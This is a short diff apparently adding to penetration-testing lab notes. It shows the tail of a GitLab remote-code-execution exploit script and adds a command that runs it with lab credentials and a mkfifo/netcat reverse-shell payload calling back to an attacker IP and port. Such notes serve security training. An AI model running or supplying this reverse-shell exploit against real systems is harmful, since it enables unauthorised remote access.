@@ -99,3 +99,6 @@ if r.text != "Failed to process image\n":
 else:
     print("[+] RCE Triggered !!")
 ````
+````bash
+python3 artur.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.31 8443 >/tmp/f '
+````
